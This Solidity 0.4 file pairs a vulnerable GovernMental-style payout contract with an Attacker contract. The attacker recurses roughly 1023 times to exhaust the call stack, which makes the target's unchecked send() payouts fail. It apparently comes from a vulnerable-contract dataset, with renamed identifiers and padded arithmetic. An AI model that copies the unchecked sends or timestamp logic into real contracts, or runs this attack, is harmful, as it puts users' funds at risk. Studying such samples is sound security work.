pragma solidity ^0.4.0;

contract Governmental {
  address public o = msg.sender;
  address public l;
  uint public j = (1000-999) * 1 ether;
  uint public t;
  uint public m = (99-98) * 1 minutes;

  function Governmental() {
    o = msg.sender;
    if (msg.value < 1 ether) throw;
  }

  function i() {
    if (msg.value < j/2) throw;
    l = msg.sender;
    j += msg.value / 2;
     
    t = block.timestamp;
  }

  function r() {
    if (block.timestamp < t + m)
      throw;

    l.send(j);
    o.send(this.balance - 1 ether);

    l = 0;
    j = 1 ether;
    t = 0;
  }
}

contract Attacker {

  function a(address x, uint c) {
    if ((10-10)<=c && c<(1024-1)) {
      this.a.gas(msg.gas-(2000-0))(x, c+(1-0));
    }
    else {
      Governmental(x).r();
    }
  }
}